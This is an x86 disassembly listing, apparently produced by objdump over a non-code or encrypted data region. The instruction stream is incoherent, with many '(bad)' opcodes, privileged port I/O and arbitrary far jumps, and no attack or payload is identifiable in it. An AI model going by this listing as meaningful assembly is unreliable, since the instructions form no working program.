  424680:	rcr    DWORD PTR [eax+ebp*1-0xf],1
  424684:	out    0x80,al
  424686:	and    cl,dl
  424688:	in     al,0xd2
  42468a:	cli    
  42468b:	lahf   
  42468c:	add    eax,0x778de6e0
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    cl,dh
  424701:	aam    0xfd
  424703:	int3   
  424704:	dec    esp
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0xc2000001,al
  42470d:	in     eax,0x3e
  42470f:	in     eax,dx
  424710:	add    edx,DWORD PTR [ecx-0x21]
  424713:	push   eax
  424714:	inc    edi
  424715:	nop
  424716:	imul   ecx,DWORD PTR [eax],0xfffffff6
  424719:	test   DWORD PTR [ebx],ebx
  42471b:	loopne 0x4246a6
  42471d:	add    al,0x62
  42471f:	pop    ds
  424720:	out    dx,eax
  424721:	fs das 
  424723:	ret    
  424724:	sub    DWORD PTR [edx+0x16],0xffffff91
  424728:	dec    ebp
  424729:	pop    eax
  42472a:	clc    
  42472b:	lds    esi,FWORD PTR [ebp+0x4]
  42472e:	jmp    0x749f:0x821cfb7e
  424735:	inc    esi
  424736:	call   0xb774:0xb9e3654
  42473d:	add    eax,0x89adafa2
  424742:	jl     0x4246f3
  424744:	pop    ebp
  424745:	ins    BYTE PTR es:[edi],dx
  424746:	jbe    0x42478b
  424748:	push   ecx
  424749:	stos   BYTE PTR es:[edi],al
  42474a:	sub    DWORD PTR [eax+edx*1+0x49305aa3],ebp
  424751:	push   0xffffffb1
  424753:	rol    DWORD PTR [ebp+0x1d92d0f4],cl
  424759:	out    0x40,eax
  42475b:	dec    ebx
  42475c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475d:	retf   
  42475e:	std    
  42475f:	clc    
  424760:	outs   dx,DWORD PTR ds:[esi]
  424761:	and    dl,BYTE PTR [ebp-0x21128955]
  424767:	push   es
  424768:	mov    edx,?
  42476a:	(bad)  
  42476b:	jl     0x424758
  42476d:	push   ds
  42476e:	ret    0x78b0
  424771:	xchg   esp,eax
  424772:	cdq    
  424773:	imul   ebx,ebx,0xffffffd4
  424776:	sbb    ch,ch
  424778:	add    BYTE PTR [ebx+0x14],dh
  42477b:	mov    eax,ds:0xbcbbe3eb
  424780:	not    BYTE PTR [edx+0x60]
  424783:	inc    DWORD PTR [esi-0x4023a269]
  424789:	pop    ecx
  42478a:	jecxz  0x424802
  42478c:	addr16 mov ah,bl
  42478f:	scas   al,BYTE PTR es:[di]
  424791:	cld    
  424792:	push   ecx
  424793:	sub    al,0xdd
  424795:	or     ch,ch
  424797:	ja     0x42475a
  424799:	and    DWORD PTR [edi],0xa5823fa9
  42479f:	xchg   ebp,eax
  4247a0:	or     ebp,DWORD PTR [ebp-0xbd1ba9]
  4247a6:	cmp    al,0x4
  4247a8:	jno    0x4247fa
  4247aa:	cmp    dh,BYTE PTR ss:[ebx-0x5e06dc3a]
  4247b1:	xchg   DWORD PTR [ecx+0x64e97b3d],esp
  4247b7:	or     eax,0xc6019b5e
  4247bc:	dec    esp
  4247bd:	call   DWORD PTR [ecx-0x7d9c69c]
  4247c3:	loop   0x4247e8
  4247c5:	test   al,0x4e
  4247c7:	rcl    BYTE PTR [ebx],cl
  4247c9:	xchg   esp,eax
  4247cb:	in     al,dx
  4247cc:	ret    
  4247cd:	push   ds
  4247ce:	mov    edx,0xdd465179
  4247d3:	push   ebx
  4247d4:	mov    eax,ds:0xb48b6fcb
  4247d9:	mov    ebp,0x7f157b64
  4247de:	icebp  
  4247df:	out    0xee,eax
  4247e1:	not    BYTE PTR [edi-0x9461464]
  4247e7:	popf   
  4247e8:	add    al,BYTE PTR [ebp+0x43]
  4247eb:	push   ecx
  4247ec:	jmp    DWORD PTR [edx-0x778fb2e4]
  4247f2:	dec    edi
  4247f3:	rol    BYTE PTR [eax-0x1d],1
  4247f6:	ins    DWORD PTR es:[edi],dx
  4247f7:	into   
  4247f8:	dec    ebx
  4247f9:	out    0xf6,eax
  4247fb:	(bad)  
  4247fc:	sbb    al,0x8a
  4247fe:	mov    ch,0x84
  424800:	lods   al,BYTE PTR ds:[esi]
  424801:	push   esp
  424802:	retf   0xe76f
  424805:	loopne 0x4247ec
  424807:	pushf  
  424808:	push   ebx
  424809:	ror    DWORD PTR [esi-0x73],cl
  42480c:	stos   DWORD PTR es:[edi],eax
  42480d:	popf   
  42480e:	push   es
  42480f:	fcomp  DWORD PTR [esi+0x0]
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	ss dec eax
  424882:	or     edi,DWORD PTR [edi+0x51]
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0xd8000001,al
  42488d:	mul    DWORD PTR [edi+0x6649c00e]
  424893:	jo     0x424908
  424895:	sub    al,0x4d
  424897:	imul   esi,DWORD PTR [ebp-0x50],0x97ee2bfc
  42489e:	mov    esi,0xbb521e4a
  4248a3:	pop    esi
  4248a4:	out    0xcf,al
  4248a6:	arpl   WORD PTR [edi],dx
  4248a8:	bound  esi,QWORD PTR [esi-0x5371c15b]
  4248ae:	mov    WORD PTR [ebx+0x32],?
  4248b1:	inc    esp
  4248b2:	adc    eax,0xb0bcf49
  4248b7:	(bad)  
  4248b8:	or     al,0xb0
  4248ba:	popf   
  4248bb:	outs   dx,DWORD PTR ds:[esi]
  4248bc:	xchg   DWORD PTR [ebp+0x5753667f],edx
  4248c2:	jp     0x424847
  4248c4:	adc    al,0x91
  4248c6:	addr16 je 0x4248b5
  4248c9:	push   es
  4248ca:	in     eax,dx
  4248cb:	gs stos BYTE PTR es:[edi],al
  4248cd:	gs pop ss
  4248cf:	jb     0x424862
  4248d1:	xchg   ebx,eax
  4248d2:	inc    edx
  4248d3:	sub    eax,0x2b99a673
  4248d8:	mov    esi,0xadd85e84
  4248dd:	jmp    0x43f6fea7
  4248e2:	adc    edx,edx
  4248e4:	or     BYTE PTR [edi+0xc],ah
  4248e7:	inc    esi
  4248e8:	sbb    eax,DWORD PTR [esi-0x43]
  4248eb:	push   0x91732b40
  4248f0:	mov    DWORD PTR [esp+esi*1+0x77],edi
  4248f4:	arpl   WORD PTR [edx+ebx*1+0x64],si
  4248f8:	je     0x42491a
  4248fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248fb:	js     0x42491d
  4248fd:	cmp    al,ch
  4248ff:	inc    edx
  424900:	or     eax,ecx
  424902:	jno    0x42491a
  424904:	mov    edi,0xab8ac7eb
  424909:	xor    dh,BYTE PTR [eax-0x3f]
  42490c:	sbb    DWORD PTR [ebx+eax*4],esp
  42490f:	fsubr  st,st(3)
  424911:	outs   dx,BYTE PTR ds:[esi]
  424912:	pop    edx
  424913:	mov    bh,0xa1
  424915:	and    BYTE PTR [edx-0x69],cl
  424918:	repz sbb edi,DWORD PTR ds:0x1ab01162
  42491f:	pop    eax
  424920:	out    0x10,al
  424922:	adc    BYTE PTR [ecx+0x3a67d8b8],al
  424928:	cmp    bl,BYTE PTR [esi-0x42]
  42492b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42492c:	xchg   ebp,eax
  42492d:	and    ah,cl
  42492f:	mov    bl,0x7
  424931:	sbb    al,0x43
  424933:	div    BYTE PTR [ebx-0x42d9b9ee]
  424939:	popf   
  42493a:	sub    eax,0xf29aba3f
  42493f:	aam    0x6
  424941:	addr16 adc al,0x34
  424944:	adc    bl,BYTE PTR [eax+ebp*8-0x787a9cf4]
  42494b:	pop    ebp
  42494c:	inc    ecx
  42494d:	or     DWORD PTR [ecx-0x16511f51],0x258c8b40
  424957:	cwde   
  424958:	mov    al,cl
  42495a:	ins    BYTE PTR es:[edi],dx
  42495b:	mov    al,0xbe
  42495d:	mov    ch,0xd0
  42495f:	inc    edi
  424960:	rcl    DWORD PTR [edi],0x69
  424963:	or     edi,DWORD PTR [edi-0x11e81fcb]
  424969:	loopne 0x424942
  42496b:	push   cs
  42496c:	inc    eax
  42496d:	push   edx
  42496e:	xor    DWORD PTR [esi+0x8],eax
  424971:	xchg   esp,eax
  424972:	sub    BYTE PTR [edx-0x120d5877],bl
  424978:	div    DWORD PTR [ecx-0x5cc56694]
  42497e:	sub    al,0xd3
  424980:	es jns 0x424998
  424983:	sti    
  424984:	fdiv   QWORD PTR [ebx-0x48]
  424987:	mov    ch,0xb1
  424989:	jmp    0x516b:0xb5589f27
  424990:	mov    es,WORD PTR [eax]
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    dh,BYTE PTR [ecx+0x3e]
  424a02:	sub    cl,BYTE PTR ds:0x18756
  424a08:	add    eax,0x71000001
  424a0d:	or     BYTE PTR [ecx],bh
  424a0f:	lock sub BYTE PTR [edi],bl
  424a12:	push   0x6d1bd2cf
  424a17:	ja     0x4249a4
  424a19:	sub    esp,DWORD PTR [ecx+edx*8-0x717f0ffd]
  424a20:	push   esp
  424a21:	jecxz  0x4249b0
  424a23:	or     esp,esi
  424a25:	les    ecx,FWORD PTR [ebx]
  424a27:	jge    0x424a30
  424a29:	push   eax
  424a2a:	icebp  
  424a2b:	pop    ss
  424a2c:	xchg   ebp,eax
  424a2d:	hlt    
  424a2e:	dec    ebp
  424a2f:	lea    eax,fs:[ebx+ebp*1+0x34]
  424a34:	int3   
  424a35:	push   ebx
  424a36:	sub    bh,cl
  424a38:	mov    al,0xa1
  424a3a:	add    dl,BYTE PTR [esi-0x35462012]
  424a40:	sub    DWORD PTR [ebx+eax*1+0x61],eax
  424a44:	ins    DWORD PTR es:[edi],dx
  424a45:	(bad)  
  424a46:	jge    0x4249fd
  424a48:	sbb    ebp,eax
  424a4a:	ficom  DWORD PTR [ebx+edi*8+0x6083325]
  424a51:	ficom  WORD PTR [esi+0x55]
  424a54:	push   ecx
  424a55:	xor    bl,BYTE PTR [ebp+0x25]
  424a58:	pop    edi
  424a59:	lahf   
  424a5a:	scas   al,BYTE PTR es:[edi]
  424a5b:	fstp   TBYTE PTR [ebx]
  424a5d:	mov    dh,0xc0
  424a5f:	idiv   BYTE PTR [edx-0x72937b4]
  424a65:	push   edi
  424a66:	int    0x71
  424a68:	out    0xa4,eax
  424a6a:	cmp    eax,0x57ed07d4
  424a6f:	outs   dx,DWORD PTR ds:[esi]
  424a70:	and    ebx,ecx
  424a72:	push   es
  424a73:	jo     0x424a39
  424a75:	arpl   WORD PTR [esp+eiz*4+0x17018931],bp
  424a7c:	imul   ebx,esi,0xffffffea
  424a7f:	push   esi
  424a80:	dec    edi
  424a81:	adc    ebp,DWORD PTR [ebx+eax*8]
  424a84:	and    dh,BYTE PTR [ebp+ebx*2+0x64]
  424a88:	pop    edi
  424a89:	add    eax,0x27ab153e
  424a8e:	adc    al,0xf7
  424a90:	aad    0x35
  424a92:	mov    al,0xfd
  424a94:	std    
  424a95:	pop    edi
  424a96:	inc    ebp
  424a97:	pop    esi
  424a98:	int    0xa1
  424a9a:	hlt    
  424a9b:	mov    ch,0xc9
  424a9d:	pop    edi
  424a9e:	mov    ?,WORD PTR [eax+edx*8-0x2]
  424aa2:	jno    0x424a33
  424aa4:	rcl    BYTE PTR cs:[ebp+edx*8-0x10],cl
  424aa9:	dec    ecx
  424aaa:	inc    ebp
  424aab:	retf   0x1be9
  424aae:	push   cs
  424aaf:	jecxz  0x424a9b
  424ab1:	and    edi,DWORD PTR [esi+eiz*8+0x5fb1ccfd]
  424ab8:	ins    DWORD PTR es:[edi],dx
  424ab9:	mov    al,0x24
  424abb:	mov    edi,0x3ecac978
  424ac0:	jb     0x424a9f
  424ac2:	lds    ebx,FWORD PTR [ebx-0x44]
  424ac5:	jle    0x424a78
  424ac7:	rcl    DWORD PTR [edx+0x70],1
  424aca:	or     DWORD PTR [edx],edx
  424acc:	fistp  QWORD PTR [ebp+0x373b6a32]
  424ad2:	inc    eax
  424ad3:	lahf   
  424ad4:	aam    0x7f
  424ad6:	outs   dx,BYTE PTR ds:[esi]
  424ad7:	fiadd  WORD PTR [esi+0x4e]
  424ada:	inc    ebp
  424adb:	push   0x0
  424add:	jno    0x424ae6
  424adf:	jecxz  0x424a8f
  424ae1:	pop    edx
  424ae2:	cmp    ch,bh
  424ae4:	pusha  
  424ae5:	cmp    al,BYTE PTR [esi]
  424ae7:	add    BYTE PTR [eax+0x75b95e51],bl
  424aed:	mov    ebp,0x3e0b450d
  424af2:	dec    eax
  424af3:	push   edx
  424af4:	(bad)  
  424af5:	in     eax,0xbd
  424af7:	iret   
  424af8:	frstor [ebx-0x145140ec]
  424afe:	iret   
  424aff:	sbb    ebp,ebp
  424b01:	adc    al,0xca
  424b03:	xchg   BYTE PTR es:[edx-0x24],bl
  424b07:	push   edi
  424b08:	fidiv  WORD PTR [edi+0x7ff63a90]
  424b0e:	mov    cl,0x92
  424b10:	out    0x0,al
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	mov    cl,0xcb
  424b82:	jg     0x424bb9
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x2a000001,al
  424b8d:	push   es
  424b8e:	dec    esi
  424b8f:	or     eax,0x569d5c9e
  424b94:	jg     0x424bd9
  424b96:	push   edi
  424b97:	inc    edi
  424b98:	hlt    
  424b99:	mov    ecx,0x6debbdb1
  424b9e:	adc    BYTE PTR [eax],bl
  424ba0:	sbb    al,BYTE PTR [esi+0x73]
  424ba3:	lahf   
  424ba4:	jmp    0x9c8959c7
  424ba9:	leave  
  424baa:	aaa    
  424bab:	push   es
  424bac:	cli    
  424bad:	cmp    bl,bl
  424baf:	cs test al,0xfe
  424bb2:	sub    DWORD PTR [edx],esi
  424bb4:	jno    0x424b3f
  424bb6:	ja     0x424b9a
  424bb8:	cmp    ebp,DWORD PTR [ebp-0x46]
  424bbb:	or     bl,ch
  424bbd:	cli    
  424bbe:	loope  0x424bce
  424bc0:	sbb    edi,DWORD PTR [edi-0x1f4df549]
  424bc6:	dec    ebp
  424bc7:	aad    0x5a
  424bc9:	mov    ch,0x94
  424bcb:	inc    edx
  424bcc:	pop    edx
  424bcd:	inc    ecx
  424bce:	sub    DWORD PTR [edi-0x7],0xffffffc0
  424bd2:	and    DWORD PTR [ecx],ebp
  424bd4:	jb     0x424c09
  424bd6:	inc    edx
  424bd8:	push   edx
  424bd9:	fld    st(0)
  424bdb:	retf   
  424bdc:	shl    ah,0xbe
  424bdf:	jno    0x424bbf
  424be1:	jl     0x424c23
  424be3:	xor    esp,DWORD PTR [edi-0x59]
  424be6:	jle    0x424c4f
  424be8:	rol    BYTE PTR [ecx-0x41],1
  424beb:	shr    DWORD PTR ds:0x565c13c,0xf9
  424bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bf3:	sbb    eax,0x84df093c
  424bf8:	(bad)  
  424bf9:	sbb    ch,BYTE PTR ds:0xb02ec2d0
  424bff:	out    0x63,eax
  424c01:	das    
  424c02:	adc    ch,BYTE PTR [ebx+eiz*2-0x34c699f9]
  424c09:	in     al,0x89
  424c0b:	sbb    DWORD PTR [ebx],eax
  424c0d:	in     al,0xa0
  424c0f:	sbb    eax,0x47df4fc0
  424c14:	(bad)  
  424c15:	lock int3 
  424c17:	push   edi
  424c18:	sub    edx,DWORD PTR [eax-0x6d213d46]
  424c1e:	lds    ecx,FWORD PTR [ebp-0x26]
  424c21:	push   eax
  424c22:	mov    dl,0x40
  424c24:	pop    ss
  424c25:	add    BYTE PTR [edi],ch
  424c27:	scas   al,BYTE PTR es:[edi]
  424c28:	daa    
  424c29:	aam    0xeb
  424c2b:	std    
  424c2c:	ins    BYTE PTR es:[edi],dx
  424c2d:	scas   eax,DWORD PTR es:[edi]
  424c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c2f:	mov    gs,WORD PTR [edi+0x7b]
  424c32:	loop   0x424be0
  424c34:	xchg   edi,ecx
  424c36:	jge    0x424c9e
  424c38:	xchg   edx,eax
  424c39:	rol    BYTE PTR [bp+si],cl
  424c3c:	dec    ebx
  424c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c3e:	mov    ecx,0x52f556fb
  424c43:	cmp    al,0x4f
  424c45:	repz popf 
  424c47:	lds    esp,FWORD PTR [ebx-0x78796b66]
  424c4d:	sbb    DWORD PTR [ebx+0x6d],ecx
  424c50:	imul   edx,DWORD PTR [ecx-0x159114ed],0xffffffef
  424c57:	xchg   ebp,eax
  424c58:	out    0xbe,eax
  424c5a:	imul   dh
  424c5c:	lods   eax,DWORD PTR ds:[esi]
  424c5d:	push   esp
  424c5e:	mov    eax,ds:0x4883248f
  424c63:	mov    al,0x58
  424c65:	int3   
  424c66:	loop   0x424c9b
  424c68:	xor    edx,DWORD PTR [ebx+0x37]
  424c6b:	push   ebp
  424c6c:	daa    
  424c6d:	pop    esp
  424c6e:	stos   BYTE PTR es:[edi],al
  424c6f:	ds int3 
  424c71:	add    BYTE PTR [ebp-0x53],bh
  424c74:	sahf   
  424c75:	in     eax,dx
  424c76:	cld    
  424c77:	mov    edx,DWORD PTR [ecx*8+0x15035ea5]
  424c7e:	and    BYTE PTR [edi-0x6079b17f],bh
  424c84:	mov    dl,0xdf
  424c86:	pushf  
  424c87:	in     eax,0xa8
  424c89:	jb     0x424cd6
  424c8b:	add    al,BYTE PTR [ebx]
  424c8d:	loopne 0x424c5f
  424c8f:	sub    BYTE PTR [eax+eax*1+0x0],al
	...
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	lea    edx,[esi-0x769fb10b]
  424d06:	add    DWORD PTR [eax],eax
  424d08:	add    eax,0xe4000001
  424d0d:	das    
  424d0e:	faddp  st(1),st
  424d10:	aaa    
  424d11:	push   es
  424d12:	popa   
  424d13:	xchg   DWORD PTR [eax-0x66113b98],edi
  424d19:	sub    DWORD PTR [ebx],edx
  424d1b:	pop    esi
  424d1c:	call   0xf262955e
  424d21:	pop    edi
  424d22:	nop
  424d23:	fucomip st,st(2)
  424d25:	fisubr WORD PTR ds:0xd2f41b97
  424d2b:	jo     0x424d34
  424d2d:	lahf   
  424d2e:	jae    0x424cf6
  424d30:	fscale 
  424d32:	div    bh
  424d34:	in     al,dx
  424d35:	sbb    DWORD PTR [ebx+edi*4+0x5b],ebp
  424d39:	es xchg esi,eax
  424d3b:	and    dl,cl
  424d3d:	shr    DWORD PTR [ecx+0x41aaa363],1
  424d43:	scas   eax,DWORD PTR es:[edi]
  424d44:	frstor [edx+0x24]
  424d47:	jmp    0xa837dea2
  424d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d4d:	pop    DWORD PTR [edx]
  424d4f:	mov    cl,0x55
  424d51:	stc    
  424d52:	rcl    DWORD PTR fs:[esi-0x45046bcc],1
  424d59:	mov    esp,0xf9899791
  424d5e:	outs   dx,BYTE PTR ds:[esi]
  424d5f:	mov    DWORD PTR [ecx-0x2f342801],edi
  424d65:	stos   BYTE PTR es:[edi],al
  424d66:	dec    edi
  424d67:	or     ch,BYTE PTR [esi]
  424d69:	dec    ebx
  424d6a:	sbb    eax,DWORD PTR [esi]
  424d6c:	sbb    ch,BYTE PTR [esp+edi*2]
  424d6f:	aas    
  424d70:	retf   
  424d71:	pop    ebp
  424d72:	cmp    BYTE PTR [eax-0x40],dl
  424d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d76:	mov    edx,0x950fbfb9
  424d7b:	cmp    DWORD PTR ds:0x18c84918,ebx
  424d81:	jns    0x424dbc
  424d83:	imul   BYTE PTR [ecx+0x58]
  424d86:	and    eax,0xaaac5cb7
  424d8b:	pop    ss
  424d8c:	outs   dx,BYTE PTR ds:[esi]
  424d8d:	jle    0x424d12
  424d8f:	jb     0x424d13
  424d91:	jbe    0x424d7c
  424d93:	inc    ebp
  424d94:	gs dec ebx
  424d96:	ss jecxz 0x424d2f
  424d99:	popf   
  424d9a:	int3   
  424d9b:	jmp    0x320cc51f
  424da0:	rcr    BYTE PTR es:0x80c46852,1
  424da7:	or     eax,0xca2f5e4e
  424dac:	cmp    DWORD PTR [edi+0x58],ebx
  424daf:	cli    
  424db0:	in     al,dx
  424db1:	sbb    al,0x53
  424db3:	daa    
  424db4:	xchg   BYTE PTR [edi],ah
  424db6:	test   BYTE PTR [ebx-0x73],al
  424db9:	pop    es
  424dba:	mov    ebx,esi
  424dbc:	adc    BYTE PTR [ebp+0x29bb111d],al
  424dc2:	into   
  424dc3:	sbb    al,0x7f
  424dc5:	pop    edi
  424dc6:	xchg   esi,eax
  424dc7:	call   0xc999f97c
  424dcc:	or     BYTE PTR [edi+0xa20e0dc],dh
  424dd2:	and    ebp,ecx
  424dd4:	mov    ebx,0x62500957
  424dd9:	cdq    
  424dda:	pop    ss
  424ddb:	pop    ds
  424ddc:	dec    BYTE PTR [edx]
  424dde:	iret   
  424ddf:	push   eax
  424de0:	push   ebp
  424de1:	inc    esp
  424de2:	out    0x33,al
  424de4:	fwait
  424de5:	jecxz  0x424e51
  424de7:	ds clc 
  424de9:	clc    
  424dea:	shr    WORD PTR ds:0xacbe849e,cl
  424df1:	jno    0x424e60
  424df3:	jbe    0x424e6a
  424df5:	popa   
  424df6:	daa    
  424df7:	sub    DWORD PTR [edx],0x6a
  424dfa:	mov    al,0xe2
  424dfc:	inc    edi
  424dfd:	int3   
  424dfe:	out    dx,al
  424dff:	xchg   ebx,ecx
  424e01:	ins    DWORD PTR es:[edi],dx
  424e02:	aas    
  424e03:	rol    DWORD PTR [esi-0x2ce9452b],0x2e
  424e0a:	ja     0x424dd8
  424e0c:	cdq    
  424e0d:	retf   0x71d5
  424e10:	lds    eax,FWORD PTR [eax]
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e50
  424e81:	loope  0x424eb3
  424e83:	ins    DWORD PTR es:[edi],dx
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0xea000001,al
  424e8d:	sub    BYTE PTR cs:[ebx+0x7f],dh
  424e91:	fld    DWORD PTR cs:[ebx+0x5a35d57b]
  424e98:	dec    eax
  424e9a:	outs   dx,DWORD PTR ds:[esi]
  424e9b:	pop    es
  424e9c:	test   dh,0x78
  424e9f:	sti    
  424ea0:	outs   dx,BYTE PTR ds:[esi]
  424ea1:	push   esp
  424ea2:	pusha  
  424ea3:	jle    0x424f0b
  424ea5:	popa   
  424ea6:	cli    
  424ea7:	sub    BYTE PTR [esi+0x3f167838],cl
  424ead:	dec    ebx
  424eae:	sub    eax,0x2ed68744
  424eb3:	or     eax,0x892bba34
  424eb8:	retf   0xc25e
  424ebb:	mov    ds:0xddd97b0f,al
  424ec0:	int    0xd0
  424ec2:	xchg   BYTE PTR [ebp-0x14],ch
  424ec5:	mov    ds:0x89dba5fe,eax
  424eca:	push   0xffffffc8
  424ecc:	xchg   esp,eax
  424ecd:	out    dx,eax
  424ece:	push   0x46e14bf1
  424ed3:	jp     0x424ec9
  424ed5:	dec    ecx
  424ed6:	jb     0x424f2a
  424ed8:	(bad)  
  424ed9:	jl     0x424ec9
  424edb:	and    BYTE PTR [eax+0xb7ef92],dl
  424ee1:	pop    edx
  424ee2:	xor    al,0x5d
  424ee5:	mov    ebp,0xd38fa134
  424eea:	pop    es
  424eeb:	pop    ss
  424eec:	mov    ds:0xdbf40757,eax
  424ef1:	push   edx
  424ef2:	lock rcl BYTE PTR [esi-0xb],cl
  424ef6:	pop    ebx
  424ef7:	outs   dx,BYTE PTR ds:[esi]
  424ef8:	jp     0x424f4b
  424efa:	push   eax
  424efb:	fstp   DWORD PTR [edi+0x5f]
  424efe:	xor    DWORD PTR [edi-0x3136d951],edi
  424f04:	jg     0x424e97
  424f06:	mov    edi,0xb4374cbe
  424f0b:	imul   esi,ebp,0x34
  424f0e:	mov    ch,0xd0
  424f10:	pop    es
  424f11:	push   cs
  424f12:	mov    dl,0xd8
  424f14:	mov    esp,ebp
  424f16:	push   ecx
  424f17:	cmp    edx,DWORD PTR [esi-0x8213bd9]
  424f1d:	inc    ecx
  424f1e:	adc    eax,0x5507babe
  424f23:	loop   0x424eda
  424f25:	push   ss
  424f26:	clc    
  424f27:	repnz sahf 
  424f29:	out    0xe7,al
  424f2b:	outs   dx,DWORD PTR ds:[esi]
  424f2c:	pop    esi
  424f2d:	mov    ch,0x20
  424f2f:	sar    BYTE PTR [esp+edi*2-0x26],0x52
  424f34:	pop    ebx
  424f35:	xchg   esi,eax
  424f36:	pop    ecx
  424f37:	pop    ecx
  424f38:	push   es
  424f39:	or     ebp,esp
  424f3b:	sti    
  424f3c:	add    BYTE PTR [edi],bl
  424f3e:	pop    ds
  424f3f:	mov    ch,BYTE PTR [esi+0x3f]
  424f42:	(bad)  
  424f43:	jg     0x424fa4
  424f45:	add    edi,DWORD PTR [ebx-0x5f]
  424f48:	fbld   TBYTE PTR [edx+0x64]
  424f4b:	clc    
  424f4c:	or     DWORD PTR [eax-0x422e96d1],0x18ee5e6d
  424f56:	inc    DWORD PTR [ebp+0x6f]
  424f59:	pop    DWORD PTR [eax]
  424f5b:	stc    
  424f5c:	inc    edx
  424f5d:	aaa    
  424f5e:	pop    ebx
  424f5f:	and    DWORD PTR [eax+0x74],ebp
  424f62:	mov    eax,0xd5ce910c
  424f67:	push   ds
  424f68:	dec    esp
  424f69:	inc    edx
  424f6a:	mov    eax,0x70239966
  424f6f:	jne    0x424fcc
  424f71:	pop    edx
  424f72:	loop   0x424f67
  424f74:	repnz adc DWORD PTR [esi],esp
  424f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f78:	dec    esi
  424f79:	lock lods al,BYTE PTR ds:[esi]
  424f7b:	xchg   esi,edi
  424f7d:	into   
  424f7e:	out    dx,al
  424f7f:	mov    dl,0x99
  424f81:	cdq    
  424f82:	daa    
  424f83:	ds xchg esi,eax
  424f85:	sub    eax,0x5fd5a141
  424f8a:	test   ch,ah
  424f8c:	scas   al,BYTE PTR es:[edi]
  424f8d:	(bad)  
  424f8e:	popf   
  424f8f:	adc    eax,0xc8
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	aaa    
  425001:	aas    
  425002:	xchg   esi,eax
  425003:	ret    0x8b6a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    eax,0x77000001
  42500d:	inc    edx
  42500e:	inc    ebx
  42500f:	fistp  QWORD PTR [edi]
  425011:	add    ecx,ebx
  425013:	mov    bh,0x8b
  425015:	pop    ecx
  425016:	mov    al,0x7c
  425018:	mov    ds:0x4c2046ea,eax
  42501d:	std    
  42501e:	or     BYTE PTR [edi+0x1aab30f],ch
  425024:	fstp   QWORD PTR [edx+ecx*2+0x6558e40f]
  42502b:	fxch   st(7)
  42502d:	scas   eax,DWORD PTR es:[edi]
  42502e:	call   0xfd5ace24
  425033:	pop    ebx
  425034:	clc    
  425035:	retf   
  425036:	aas    
  425037:	test   DWORD PTR [eax+0x68295dcf],esp
  42503d:	cwde   
  42503e:	mov    ?,WORD PTR [ebp+ecx*2-0x4a]
  425042:	xor    cl,bh
  425044:	jmp    0xdf1c:0x852d6b49
  42504b:	aam    0x56
  42504d:	in     al,0x5d
  42504f:	mov    ah,0xd7
  425051:	cli    
  425052:	or     al,0xb2
  425054:	cli    
  425055:	bound  eax,QWORD PTR [edi]
  425057:	(bad)  
  425058:	fimul  DWORD PTR [edi+0x1d49e42a]
  42505e:	test   BYTE PTR [edx],al
  425060:	pop    ebx
  425061:	xchg   esi,eax
  425062:	nop
  425063:	pop    ebp
  425064:	lods   al,BYTE PTR ds:[esi]
  425065:	int    0xc8
  425067:	add    al,0x8e
  425069:	push   ebx
  42506a:	outs   dx,BYTE PTR ds:[esi]
  42506b:	mov    ds:0x67ae79b8,eax
  425070:	lds    edi,FWORD PTR [ebp+0x5c]
  425073:	or     esi,DWORD PTR [edi+0x160ed826]
  425079:	jge    0x42507b
  42507b:	add    al,BYTE PTR [ebx+0x14]
  42507e:	pop    ebp
  42507f:	out    0x7c,eax
  425081:	xor    esp,DWORD PTR [esi]
  425083:	cmc    
  425084:	pusha  
  425085:	cli    
  425086:	pop    eax
  425087:	pop    edi
  425088:	fdiv   DWORD PTR [ebx+0x38]
  42508b:	mov    esp,0xd0859b79
  425090:	mov    al,ds:0xe7e4bc0d
  425095:	jecxz  0x425017
  425097:	xor    DWORD PTR [eax],ecx
  425099:	je     0x425088
  42509b:	(bad)  
  42509c:	adc    eax,0xc425a699
  4250a1:	fsub   QWORD PTR [eax-0x2d]
  4250a4:	fldenv [ebx-0x72]
  4250a7:	jno    0x42510d
  4250a9:	jge    0x42508b
